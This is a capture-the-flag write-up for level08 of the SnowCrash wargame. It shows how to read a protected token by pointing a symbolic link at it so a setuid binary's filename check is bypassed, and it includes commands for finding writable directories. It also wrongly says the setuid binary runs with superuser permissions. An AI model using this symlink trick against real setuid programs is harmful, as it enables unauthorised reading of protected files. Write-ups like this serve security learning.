### binary

a binary named level08 and file named token are present in the home
both files are owned by flag08 but the binary is executable by level08
-> it takes a file as parameter and echo the contents of that file. It refuses a file named 'token'
we can assume it can read the content of the token file but reject its name -> rename token file without permission to read
the size of the token file indicates that it can be the flag for level08

-> read it with symbolic links 


```ln -s ~/token /tmp/file```
```./level08 /tmp/file``` = token



find a folder that can be readable and writable by user :
```find / -writable 2>/dev/null```



### see extended permissions of a file
```getfacl level08 ```
file: level08
owner: flag08
group: level08
flags: ss-
user::rwx
group::---
group:level08:r-x
group:flag08:r-x
mask::r-x
other::---

we can see that the binary is setiud and setgid :
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08

-> it executes with superuser permissions

more info on the subject : https://tech.feub.net/2008/03/setuid-setgid-et-sticky-bit/